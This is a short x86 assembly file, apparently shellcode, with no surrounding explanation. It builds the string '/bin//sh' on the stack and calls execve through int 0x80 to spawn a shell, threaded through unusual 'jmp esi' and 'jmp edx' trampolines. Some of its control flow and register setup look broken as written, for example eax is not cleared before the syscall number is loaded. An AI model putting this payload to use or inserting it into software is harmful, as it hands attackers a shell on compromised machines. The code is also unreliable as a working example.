section .text
global start
global main

start:
main:
push   ebp
mov    ebp, esp
mov    esi, edx
add    esi, 12
jmp    esi
add    edx, 12
jmp    edx
push   eax
push   0x68732f2f
jmp    esi
push   0x6e69622f
jmp    esi
mov    ebx, esp
jmp    esi
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
ret
leave